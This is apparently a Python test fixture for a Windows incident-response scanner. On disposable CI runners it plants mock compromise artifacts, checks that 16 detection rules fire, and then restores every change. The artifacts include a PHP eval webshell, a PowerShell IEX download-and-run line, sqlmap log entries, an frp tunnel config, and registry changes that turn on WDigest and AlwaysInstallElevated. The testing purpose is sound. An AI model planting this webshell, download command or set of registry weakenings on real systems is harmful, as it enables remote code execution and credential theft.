"""Extra high-frequency cases, exclusively on disposable GitHub-hosted Windows runners.
No JW2026 dependency, no real history, no .env/.git cleanup. Exact file/registry restore.
"""
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import winreg

if not (os.environ.get('GITHUB_ACTIONS') == 'true' and
        os.environ.get('RUNNER_ENVIRONMENT') == 'github-hosted'):
    raise SystemExit('Refusing non-disposable host; GitHub-hosted runner required')
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
binpath = os.path.abspath(sys.argv[1])
root = Path(tempfile.mkdtemp(prefix='ctfir-marker-exam-'))
files, dirs, regs = {}, [], []

def mkdir(p):
    if p.exists():
        return
    mkdir(p.parent)
    p.mkdir()
    dirs.append(p)

def put(p, value):
    p = Path(p)
    mkdir(p.parent)
    if p not in files:
        files[p] = p.read_bytes() if p.exists() else None
    p.write_bytes(value.encode('utf-8'))

def reg(hive, key, name, value, typ):
    # Backup absence/value/type before every write; no whole-key delete.
    try:
        with winreg.OpenKey(hive, key) as k:
            original = winreg.QueryValueEx(k, name)
    except FileNotFoundError:
        original = None
    regs.append((hive, key, name, original))
    with winreg.CreateKeyEx(hive, key, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, name, 0, typ, value)

expected = {
 'WIN.WEB.WEBSHELL.001', 'WIN.WEB.BLACKLINK.001', 'WIN.WEB.LOGPOST.001',
 'WIN.WEB.LOGATTACK.001', 'WIN.TOOLS.ARTIFACT.001', 'WIN.TOOLS.FRPCFG.001',
 'WIN.TRACE.PSHIST.001', 'WIN.AUTORUN.APPINIT.001', 'WIN.BASE.WDIGEST.001',
 'WIN.BASE.ALWAYSINST.001', 'WIN.BASE.LATFP.001', 'WIN.BASE.NTLMV1.001',
 'WIN.BASE.PS.UNRESTRICT.001', 'WIN.RMT.SOFTWARE.001', 'WIN.RANSOM.TRACE.001',
 'MID.MYSQL.SLOWLOG.001'
}
try:
    desktop = Path(os.environ['USERPROFILE']) / 'Desktop'
    put(r'C:\inetpub\wwwroot\ctfir-marker-hf.php', '<?php eval($_POST["cmd"]); ?>')
    put(r'C:\inetpub\wwwroot\ctfir-marker-hf.html',
        '<div style="display:none"><a href="http://evil.example/bet">bet</a></div>')
    access = '10.88.88.88 - - [13/Nov/2026:10:00:00 +0800] "POST /ctfir-marker-hf.php HTTP/1.1" 200 -\n'
    access = access * 60 + '10.88.88.88 - - [13/Nov/2026:10:01:00 +0800] "GET /index.php?id=1%20UNION%20SELECT%201 HTTP/1.1" 200 - "-" "sqlmap/1.7"\n'
    put(r'C:\phpstudy\PHPTutorial\Apache\logs\access.log', access)
    put(desktop / 'fscan.exe', 'MZ')
    put(desktop / 'frpc.ini', '[common]\nserver_addr = 10.66.66.66\nserver_port = 7000\n')
    put(root / 'history' / 'ConsoleHost_history.txt', "IEX(New-Object Net.WebClient).DownloadString('http://10.66.66.66/a')\n")
    put(desktop / 'ctfir-marker-README_DECRYPT_FILES.html', 'YOUR FILES HAVE BEEN ENCRYPTED')
    put(desktop / 'ctfir-marker-victim.docx.locked', 'test')
    put(r'C:\phpstudy\PHPTutorial\MySQL\data\mysql-slow.log',
        'SELECT eval INTO OUTFILE C:/inetpub/wwwroot/ctfir-marker.php;')
    mkdir(Path(r'C:\Program Files\Oray\SunLogin'))
    lm = winreg.HKEY_LOCAL_MACHINE
    reg(lm, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows', 'AppInit_DLLs',
        r'C:\Windows\Temp\ctfir-marker-hf.dll', winreg.REG_SZ)
    reg(lm, r'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest', 'UseLogonCredential', 1, winreg.REG_DWORD)
    for h in (lm, winreg.HKEY_CURRENT_USER):
        reg(h, r'SOFTWARE\Policies\Microsoft\Windows\Installer', 'AlwaysInstallElevated', 1, winreg.REG_DWORD)
    reg(lm, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'LocalAccountTokenFilterPolicy', 1, winreg.REG_DWORD)
    reg(lm, r'SYSTEM\CurrentControlSet\Control\Lsa', 'LmCompatibilityLevel', 1, winreg.REG_DWORD)
    reg(lm, r'SOFTWARE\Policies\Microsoft\Windows\PowerShell', 'ExecutionPolicy', 'Unrestricted', winreg.REG_SZ)
    env = dict(os.environ, CTFIR_FIXTURE_PSHIST=str(root / 'history'))
    run = subprocess.run([binpath, 'scan', '--out', str(root / 'out'), '--profile', 'full'], env=env)
    assert run.returncode in (0, 1, 2), run.returncode
    data = json.loads((root / 'out' / 'findings.json').read_text(encoding='utf-8'))
    findings = data if isinstance(data, list) else data['findings']
    seen = {f['rule_id'] for f in findings}
    for rule in sorted(expected):
        print('[PASS]' if rule in seen else '[FAIL]', rule)
    missing = expected - seen
    assert not missing, sorted(missing)
    print('EXAM_WINDOWS pass=16 fail=0')
finally:
    for h, key, name, original in reversed(regs):
        with winreg.OpenKey(h, key, 0, winreg.KEY_SET_VALUE) as k:
            if original is None:
                try:
                    winreg.DeleteValue(k, name)
                except FileNotFoundError:
                    pass
            else:
                winreg.SetValueEx(k, name, 0, original[1], original[0])
    for p, original in reversed(list(files.items())):
        if original is None:
            p.unlink(missing_ok=True)  # Only paths this run created, never .env/.git.
        else:
            p.write_bytes(original)
        assert (not p.exists()) if original is None else p.read_bytes() == original
    for d in reversed(dirs):
        d.rmdir()  # Refuse recursive deletion / unexpected files.
    for h, key, name, original in regs:
        with winreg.OpenKey(h, key) as k:
            try:
                actual = winreg.QueryValueEx(k, name)
            except FileNotFoundError:
                actual = None
            assert actual == original, (key, name)
    shutil.rmtree(root)  # Owned unique temporary directory only.
    print('EXAM_WINDOWS cleanup=verified')
